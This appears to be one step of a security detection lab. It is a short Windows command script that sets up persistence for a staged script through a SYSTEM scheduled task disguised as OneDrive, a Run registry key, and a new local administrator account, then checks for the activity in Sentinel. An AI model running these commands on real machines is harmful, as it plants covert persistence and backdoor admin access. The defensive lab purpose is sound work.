# Step 4 (the attack, part 2): make the script run again by itself, three different ways.
# Run in the same PowerShell window as step 3.

Get-Date -Format "yyyy-MM-dd HH:mm:ss"      # write this time down

# 1. A scheduled task, run as SYSTEM at every logon, with a name that imitates OneDrive.
schtasks /create /tn "OneDriveSyncHelper" /tr "C:\Users\Public\invoice_update.cmd" /sc onlogon /ru SYSTEM /f

# 2. A "Run" registry value: runs for this user at every logon.
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v OneDriveSync /t REG_SZ /d "C:\Users\Public\invoice_update.cmd" /f

# 3. A new local administrator.
#    Pick your own throwaway password. It WILL appear in the Windows log, in plain text, because
#    it is typed on the command line. That is a finding in itself, so do not reuse a real password.
net user helpdesk01 "<ThrowawayLabPassword>" /add
net localgroup administrators helpdesk01 /add

Get-Date -Format "yyyy-MM-dd HH:mm:ss"      # write this time down

# Proof test: restart the VM (Start > Power > Restart), log back in over RDP, wait a few minutes,
# then look in Sentinel for the script being started at logon (see ../../case-2-endpoint-persistence/queries.kql).
